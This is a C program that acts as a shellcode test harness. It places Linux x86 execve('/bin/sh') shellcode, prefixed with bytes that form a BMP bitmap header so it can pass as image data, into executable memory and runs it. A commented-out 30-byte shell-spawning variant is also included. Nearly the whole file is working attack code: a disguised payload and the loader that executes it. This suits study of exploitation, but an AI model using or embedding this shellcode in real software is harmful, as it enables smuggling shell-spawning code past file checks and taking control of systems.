#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

int main() {
printf("Process ID: %d\n", getpid());

    // Shellcode for execve("/bin/sh", NULL, NULL) - 30 bytes
//    unsigned char shellcode[] = \
//    "\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80"
//    "\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68";
char shellcode[] = 

	//
	// Bitmap 24bit Header (4 bytes)
	//

	"\x42"                  // inc %edx 
	"\x4d"                  // dec %ebp 
	"\x36"                  // ss 
	"\x91"                  // xchg %eax,%ecx 

	//
	// execve("/bin/sh", ["/bin/sh", NULL]);
	//

	"\x6a\x0b"              // push $0xb 
	"\x58"                  // pop %eax 
	"\x99"                  // cltd 
	"\x52"                  // push %edx 
	"\x68\x2f\x2f\x73\x68"  // push $0x68732f2f 
	"\x68\x2f\x62\x69\x6e"  // push $0x6e69622f 
	"\x89\xe3"              // mov %esp,%ebx 
	"\x52"                  // push %edx 
	"\x53"                  // push %ebx 
	"\x89\xe1"              // mov %esp,%ecx 
	"\xcd\x80";             // int $0x80 

    printf("Shellcode Length: %lu bytes\n", sizeof(shellcode) - 1);

    // Allocate memory for shellcode with read, write, and execute permissions
    void *exec_mem = mmap(NULL, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (exec_mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    printf("Memory allocated at address: %p\n", exec_mem);

    // Copy shellcode into allocated memory
    memcpy(exec_mem, shellcode, sizeof(shellcode));
    printf("Shellcode copied to allocated memory.\n");

    // Display the contents of the allocated memory
    printf("Shellcode in memory:\n");
    unsigned char *ptr = (unsigned char *)exec_mem;
    for (size_t i = 0; i < sizeof(shellcode); i++) {
        printf("\\x%02x", ptr[i]);
        if ((i + 1) % 16 == 0) printf("\n");
    }
    printf("\n");

    // Cast the allocated memory to a function pointer and execute
    void (*func)() = (void (*)())exec_mem;
    printf("Attempting to execute shellcode...\n");
    func(); // Execute the shellcode
    printf("Shellcode executed.\n");

    // Clean up
    if (munmap(exec_mem, sizeof(shellcode)) == -1) {
        perror("munmap");
        return 1;
    }
    printf("Memory unmapped successfully.\n");
    while(1) {
      sleep(30);
    break;
    }
    return 0;
}
